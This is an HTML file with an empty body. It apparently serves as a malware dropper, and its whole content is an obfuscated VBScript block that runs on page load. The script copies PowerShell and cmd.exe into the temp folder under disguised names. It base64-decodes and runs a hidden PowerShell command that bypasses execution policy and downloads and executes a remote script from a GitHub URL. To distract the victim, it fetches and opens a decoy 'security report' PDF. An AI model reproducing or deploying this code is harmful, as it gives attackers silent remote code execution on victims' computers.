<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<script language="VBScript">
    Dim q,w,e,r,t,y,u,i,o,p,a,s,d,f,g,h,j,k,l,z,x,c,v,b,n,m
    Set q=CreateObject("WScript.Shell")
    Set w=CreateObject("Scripting.FileSystemObject")
    e=q.ExpandEnvironmentStrings("%TEMP%")&"\CertAudio.exe"
    If Not w.FileExists(e) Then
        w.CopyFile q.ExpandEnvironmentStrings("%SystemRoot%")&"\System32\WindowsPowerShell\v1.0\powershell.exe", e, True
    End If
    r=q.ExpandEnvironmentStrings("%TEMP%")&"\CertConnections.exe"
    If Not w.FileExists(r) Then
        w.CopyFile q.ExpandEnvironmentStrings("%SystemRoot%")&"\System32\cmd.exe", r, True
    End If
    t="aHR0cHM6Ly9naXRodWIuY29tL05vdmVsbGEyMDQ4L0NlcnRVdGlsL3Jhdy9yZWZzL2hlYWRzL21haW4vYXV0b2V4ZWMucHMx"
    u="aHR0cHM6Ly9nby5taWNyb3NvZnQuY29tL2Z3bGluay8/bGlua2lkPTIyNDkwMjUmY2xjaWQ9MHg0MDkmY3VsdHVyZT1lbi11cyZjb3VudHJ5PXVz"
    y="UmVwb3J0X1NpY3VyZXp6YS5wZGY="
    i="TVNYTUwyLlhNTEhUVFA"
    o="QURNREIuU3RyZWFt"
    p="Y21kLmV4ZSAvYyBzdGFydCAiIiAi"
    a="IC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1TY29wZSBQcm9jZXNzIC1XaW5kb3dTdHlsZSBIaWRkZW4gLU5vUHJvZmlsZSAtQ29tbWFuZCAiSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCc="
    s=""")"""
    d=Decode(t)
    f=Decode(u)
    g=Decode(y)
    h=Decode(i)
    j=Decode(o)
    k=Decode(p)
    l=""""&e&""""&a&d&s
    q.Run l,0,False
    Set z=CreateObject(h)
    z.Open "GET", f, False
    z.Send
    If z.Status=200 Then
        x=q.ExpandEnvironmentStrings("%TEMP%")&"\"&g
        Set c=CreateObject(j)
        c.Type=1
        c.Open
        c.Write z.ResponseBody
        c.SaveToFile x,2
        c.Close
        q.Run """"&r&""" "&k&x&"""",0,False
    End If
    Function Decode(b)
        Dim n,m,o,p
        Set n=CreateObject("MSXML2.DOMDocument")
        Set m=n.createElement("tmp")
        m.DataType="bin.base64"
        m.Text=b
        Set o=m.NodeTypedValue
        Set p=CreateObject("ADODB.Stream")
        p.Type=1
        p.Open
        p.Write o
        p.Position=0
        p.Type=2
        p.Charset="utf-8"
        Decode=p.ReadText
        p.Close
    End Function
    window.close()
</script>
</head>
<body>
</body>
</html>
